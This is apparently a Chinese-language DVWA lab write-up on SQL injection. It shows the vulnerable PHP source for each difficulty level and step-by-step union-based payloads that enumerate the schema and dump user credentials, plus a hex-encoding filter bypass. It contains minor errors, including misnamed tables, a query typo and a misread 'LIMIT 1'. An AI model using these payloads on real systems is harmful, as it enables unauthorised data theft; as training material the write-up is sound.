<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><pre><code>1.判断是否存在注入，注入是字符型还是数字型

2.猜解SQL查询语句中的字段数

3.确定显示的字段顺序

4.获取当前数据库

5.获取数据库中的表

6.获取表中的字段名

7.下载数据</code></pre><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><pre><code>&lt;?php

if( isset( $_REQUEST[ &apos;Submit&apos; ] ) ) {
    // Get input
    $id = $_REQUEST[ &apos;id&apos; ];

    // Check database
    $query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos;;&quot;;
    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );

    // Get results
    while( $row = mysqli_fetch_assoc( $result ) ) {
        // Get values
        $first = $row[&quot;first_name&quot;];
        $last  = $row[&quot;last_name&quot;];

        // Feedback for end user
        echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;;
    }

    mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);
}

?&gt; </code></pre><p>Low级别没有进行任何的过滤与防御，可以直接进行SQL注入</p>
<p>（1）判断是否存在注入及判断注入类型</p>
<pre><code>1                             可以显示
1&apos;                            报错
1&apos; and &apos;1&apos;=&apos;2                 查询结果为空
1&apos; or &apos;1&apos;=&apos;1                所有结果全被列出</code></pre><p>说明存在字符型注入</p>
<p>（2）判断字段数</p>
<pre><code>1&apos; order by 10#             #报错
1’ order by 5#                #报错
1&apos; order by 3#                #报错
1’ order by 2#                #正常显示</code></pre><p>说明存在两个字段</p>
<p>（3）判断显示的字段顺序</p>
<pre><code>1&apos; union select 1,2 #                    #测试显位情况</code></pre><p>![1554441500161](E:\网络空间信息安全\测试靶场\DVWA\分类详解\SQL Injection\assets\1554441500161.png)</p>
<p>（4）猜数据库名</p>
<pre><code>1&apos; union select 1,database() #            #猜数据库名</code></pre><p>![1554441447771](E:\网络空间信息安全\测试靶场\DVWA\分类详解\SQL Injection\assets\1554441447771.png)</p>
<p>数据库名为dvwa</p>
<p>（5）猜表名</p>
<pre><code>1&apos; union select 1,group_concat(table_name) from information_schema.tables where table_schema=&apos;dvwa&apos; #</code></pre><p>![1554442207282](E:\网络空间信息安全\测试靶场\DVWA\分类详解\SQL Injection\assets\1554442207282.png)</p>
<p>得到数据库名为user和guestbook</p>
<p>（6）猜列名</p>
<pre><code>1&apos; union select 1,group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos; #</code></pre><p>![1554442511752](E:\网络空间信息安全\测试靶场\DVWA\分类详解\SQL Injection\assets\1554442511752.png)</p>
<p>得到列名</p>
<p>（7）下载数据</p>
<pre><code>1&apos; union select user,password from users #</code></pre><p>![1554442879160](E:\网络空间信息安全\测试靶场\DVWA\分类详解\SQL Injection\assets\1554442879160.png)</p>
<p>得到用户名和密码</p>
<h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><pre><code>&lt;?php

if( isset( $_POST[ &apos;Submit&apos; ] ) ) {
    // Get input
    $id = $_POST[ &apos;id&apos; ];

    $id = mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $id);

    $query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;;
    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query) or die( &apos;&lt;pre&gt;&apos; . mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) . &apos;&lt;/pre&gt;&apos; );

    // Get results
    while( $row = mysqli_fetch_assoc( $result ) ) {
        // Display values
        $first = $row[&quot;first_name&quot;];
        $last  = $row[&quot;last_name&quot;];

        // Feedback for end user
        echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;;
    }

}

// This is used later on in the index.php page
// Setting it here so we can close the database connection in here like in the rest of the source scripts
$query  = &quot;SELECT COUNT(*) FROM users;&quot;;
$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );
$number_of_rows = mysqli_fetch_row( $result )[0];

mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);
?&gt; </code></pre><p>利用mysqli_real_escape_string转义了常用的注入字符，同时用下拉菜单输入控制长度为1，![1554443151578](E:\网络空间信息安全\测试靶场\DVWA\分类详解\SQL Injection\assets\1554443151578.png)</p>
<p>但可以通过抓包更改</p>
<p>（1)判断是否存在注入及注入类型</p>
<pre><code>1                             #正常显示
1&apos;                          #报错
1&apos; or &apos;1&apos;=&apos;1                #报错
1 and 1=2                    #无显示数据
1 or 1=1                    #正常显示                        </code></pre><p>说明存在数字型注入，因此mysqli_real_escape_string的转义就没有用处了</p>
<p>（2）判断字段数</p>
<pre><code>1 order by 10#                #报错
1 order by 5#                #报错
1 order by 3#                #报错
1 order by 2#                正常显示</code></pre><p>说明存在两个字段</p>
<p>（3）判断字段显示顺序</p>
<pre><code>1 union select 1,2 #</code></pre><p>![1554443636897](E:\网络空间信息安全\测试靶场\DVWA\分类详解\SQL Injection\assets\1554443636897.png)</p>
<p>（4）猜数据库名</p>
<pre><code>1 union select 1,database()#</code></pre><p>![1554443731195](E:\网络空间信息安全\测试靶场\DVWA\分类详解\SQL Injection\assets\1554443731195.png)</p>
<p>数据库名为dvwa</p>
<p>（5）猜表名</p>
<pre><code>1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #</code></pre><p>![1554444096577](E:\网络空间信息安全\测试靶场\DVWA\分类详解\SQL Injection\assets\1554444096577.png)</p>
<p>(6)猜列名</p>
<pre><code>1 union select 1，group(column_name) from information_schema.columns where table_name=&apos;users&apos;#                #失败，因为&apos;被过滤掉了
id=1 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273#            #可以十六进制绕过</code></pre><p>![1554444883387](E:\网络空间信息安全\测试靶场\DVWA\分类详解\SQL Injection\assets\1554444883387.png)</p>
<p>（7）下载数据</p>
<pre><code>1 union select user,password from users #</code></pre><p>![1554445203627](E:\网络空间信息安全\测试靶场\DVWA\分类详解\SQL Injection\assets\1554445203627.png)</p>
<h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><pre><code>&lt;?php

if( isset( $_SESSION [ &apos;id&apos; ] ) ) {
    // Get input
    $id = $_SESSION[ &apos;id&apos; ];

    // Check database
    $query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos; LIMIT 1;&quot;;
    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&apos; );

    // Get results
    while( $row = mysqli_fetch_assoc( $result ) ) {
        // Get values
        $first = $row[&quot;first_name&quot;];
        $last  = $row[&quot;last_name&quot;];

        // Feedback for end user
        echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;;
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);        
}

?&gt; </code></pre><p>审计代码可知，High等级将id的长度限制到了1，但我们可以通过#将其注释掉使其不起作用，注入过程如下：</p>
<p>（1）判断是否存在注入点，判断注入类型</p>
<pre><code>1#                         #正常显示
1&apos;#                        #正常显示
1 or 1=1#                #正常显示
1&apos; or &apos;1&apos;=&apos;1&apos;#            #全部显示</code></pre><p>存在字符型注入</p>
<p>（2）判断字段数</p>
<pre><code>1’ order by 1#            #正常显示
1&apos; order by 2#            #正常显示
1’ order by 3#            #报错</code></pre><p>证明字段数为2</p>
<p>（3）判断字段显示顺序</p>
<pre><code>1&apos;union select 1,2#    </code></pre><p>![1554446726112](E:\网络空间信息安全\测试靶场\DVWA\分类详解\SQL Injection\assets\1554446726112.png)</p>
<p>(4)判断数据库名</p>
<pre><code>1&apos; union select 1,database()#</code></pre><p>![1554446800656](E:\网络空间信息安全\测试靶场\DVWA\分类详解\SQL Injection\assets\1554446800656.png)</p>
<p>（5）判断表名</p>
<pre><code>1&apos; union select 1,group_concat(table_name) from information_schema.tables where table_schema=&apos;dvwa&apos; #</code></pre><p>![1554447035009](E:\网络空间信息安全\测试靶场\DVWA\分类详解\SQL Injection\assets\1554447035009.png)</p>
<p>(6) 判断列名</p>
<pre><code>1&apos; union select 1,group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos; #</code></pre><p>![1554447818263](E:\网络空间信息安全\测试靶场\DVWA\分类详解\SQL Injection\assets\1554447818263.png)</p>
<p>(7)下载数据</p>
<pre><code>1&apos; union select user,password from users#</code></pre><p>![1554447921169](E:\网络空间信息安全\测试靶场\DVWA\分类详解\SQL Injection\assets\1554447921169.png)</p>
<h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><pre><code>&lt;?php

if( isset( $_GET[ &apos;Submit&apos; ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; );

    // Get input
    $id = $_GET[ &apos;id&apos; ];

    // Was a number entered?
    if(is_numeric( $id )) {
        // Check the database
        $data = $db-&gt;prepare( &apos;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&apos; );
        $data-&gt;bindParam( &apos;:id&apos;, $id, PDO::PARAM_INT );
        $data-&gt;execute();
        $row = $data-&gt;fetch();

        // Make sure only 1 result is returned
        if( $data-&gt;rowCount() == 1 ) {
            // Get values
            $first = $row[ &apos;first_name&apos; ];
            $last  = $row[ &apos;last_name&apos; ];

            // Feedback for end user
            echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;;
        }
    }
}

// Generate Anti-CSRF token
generateSessionToken();

?&gt; </code></pre><p>POD实现了代码与数据分离，无法SQL注入</p>
